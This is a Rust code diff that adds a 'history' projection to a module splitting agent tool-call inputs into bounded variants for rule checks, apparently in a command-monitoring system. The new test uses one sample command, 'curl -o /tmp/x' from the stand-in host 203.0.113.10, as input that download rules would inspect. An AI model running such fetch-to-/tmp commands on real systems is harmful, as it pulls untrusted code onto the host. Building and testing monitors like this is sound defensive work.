@@ -48,8 +48,9 @@
 //! block of short top-level values go into every variant, every chunk of a
 //! longer command comes ahead of other values (first chunks first, so one
 //! command cannot crowd out another), and then the start of other values while
-//! variants remain. A command comes first whatever the member names sort as,
-//! so the first variant, which history keeps, holds one. Otherwise the layout
+//! variants remain. A command comes first whatever the member names sort as.
+//! History keeps a line of its own ([`Projection::history`]): the start of
+//! every command together, then short top-level values. Otherwise the layout
 //! follows key-sorted order (members arrive sorted by name, not in the order
 //! the agent wrote them). Whatever is in no variant, a value cut short for
 //! room included, is not evaluated, and is reported as separated, so it floors
@@ -127,6 +128,11 @@ pub(crate) fn is_command_key(key: &str) -> bool {
 pub struct Projection {
     /// Bounded inputs whose union covers every byte of the original.
     pub variants: Vec<Value>,
+    /// What history keeps of the call, within the bounds of a variant: the
+    /// start of every command, then short top-level values, then the start
+    /// of other values. Unlike the variants it holds the commands together,
+    /// so a later call can link to what each of them did.
+    pub history: Value,
     /// Values or parts of a command that a rule may need together are not
     /// together in any variant: more short top-level values than the variant
     /// budget can pair up, a command longer than one chunk, or more than one
@@ -460,11 +466,11 @@ fn pack(items: &[Item], count: usize, bytes: usize) -> Vec<&[Item]> {
     runs
 }
 
-/// A variant holding `groups`. Flattening can give two values one key (`a.b`
+/// A variant holding `items`. Flattening can give two values one key (`a.b`
 /// beside `a: {b}`); the later one is renamed, so neither value is dropped.
-fn variant(groups: &[&[Item]]) -> Value {
+fn variant<'a>(items: impl IntoIterator<Item = &'a Item>) -> Value {
     let mut object = Map::new();
-    for item in groups.iter().flat_map(|group| group.iter()) {
+    for item in items {
         let text = Value::String(item.text.clone());
         if item.list
             && let Some(Value::Array(items)) = object.get_mut(&item.key)
@@ -486,6 +492,29 @@ fn variant(groups: &[&[Item]]) -> Value {
         object.insert(name, value);
     }
     Value::Object(object)
+}
+
+/// What history keeps of a projected call, within a variant's bounds: the
+/// first chunk of every command (in key order), then anchors, then the first
+/// chunks of other values, while they fit. If not every command fits, the
+/// call is already reported separated: it has more than one.
+fn history(anchors: &[Item], rest: &[Item]) -> Value {
+    let mut kept: Vec<&Item> = Vec::new();
+    let mut bytes = 0;
+    let commands = rest.iter().filter(|item| item.command);
+    for item in commands.chain(anchors).chain(rest) {
+        if kept.len() == LEAVES_PER_VARIANT {
+            break;
+        }
+        if kept.iter().any(|other| other.leaf == item.leaf)
+            || bytes + item.bytes > VARIANT_BYTES - 2
+        {
+            continue;
+        }
+        bytes += item.bytes;
+        kept.push(item);
+    }
+    variant(kept)
 }
 
 /// Bounded variants whose union covers every byte of `input`, or past the
@@ -593,6 +622,7 @@ pub fn project(input: &Value) -> Option<Projection> {
     while rest.len() < count {
         rest.extend(rounds.iter_mut().filter_map(Iterator::next));
     }
+    let history = history(&anchors, &rest);
 
     // Few anchors go into every variant. More are split into blocks: every
     // two blocks share a variant, and so do every block and every group.
@@ -619,19 +649,20 @@ pub fn project(input: &Value) -> Option<Projection> {
         let mut variants = Vec::new();
         for group in &groups {
             for block in &blocks {
-                variants.push(variant(&[block, group]));
+                variants.push(variant(block.iter().chain(group.iter())));
             }
         }
         for (i, first) in blocks.iter().enumerate() {
             for second in &blocks[i + 1..] {
-                variants.push(variant(&[first, second]));
+                variants.push(variant(first.iter().chain(second.iter())));
             }
         }
         if variants.is_empty() {
-            variants.push(variant(&blocks));
+            variants.push(variant(blocks.iter().flat_map(|block| block.iter())));
         }
         return Some(Projection {
             variants,
+            history,
             separated,
             past_budget: !whole,
         });
@@ -647,7 +678,8 @@ pub fn project(input: &Value) -> Option<Projection> {
         let groups = pack(&all, LEAVES_PER_VARIANT, VARIANT_BYTES - 2);
         if groups.len() <= MAX_VARIANTS {
             return Some(Projection {
-                variants: groups.into_iter().map(|group| variant(&[group])).collect(),
+                variants: groups.into_iter().map(variant).collect(),
+                history,
                 separated: true,
                 past_budget: false,
             });
@@ -671,10 +703,11 @@ pub fn project(input: &Value) -> Option<Projection> {
     let variants = groups
         .iter()
         .take(MAX_VARIANTS)
-        .map(|group| variant(&[&first, group]))
+        .map(|group| variant(first.iter().chain(group.iter())))
         .collect();
     Some(Projection {
         variants,
+        history,
         separated: true,
         past_budget: true,
     })
@@ -1076,6 +1109,36 @@ mod tests {
                 .collect();
             assert!(covered(&alone, &command[..30]), "{}", command.len());
             assert!(covered(&alone, short), "{}", command.len());
+        }
+    }
+
+    /// What history keeps of a projected call holds the start of every
+    /// command member, beside its short top-level values, though the
+    /// variants evaluate the commands apart.
+    #[test]
+    fn history_holds_the_start_of_every_command_member() {
+        let download = "curl -o /tmp/x http://203.0.113.10/x";
+        let long = format!("{download}; echo {}", "a".repeat(5000));
+        for command in [download.to_owned(), long] {
+            let input = json!({
+                "cmd": "true",
+                "command": command,
+                "description": "d".repeat(5000),
+                "path": "/w/a",
+            });
+            let projection = project(&input).unwrap();
+            let history = &projection.history;
+            within_bounds(std::slice::from_ref(history));
+            assert_eq!(history["cmd"], "true", "{}", command.len());
+            let start = history["command"].as_str().unwrap();
+            assert!(start.starts_with(download), "{}", command.len());
+            assert_eq!(history["path"], "/w/a", "{}", command.len());
+            assert!(
+                projection
+                    .variants
+                    .iter()
+                    .all(|v| v.get("cmd").is_none() || v.get("command").is_none())
+            );
         }
     }
 
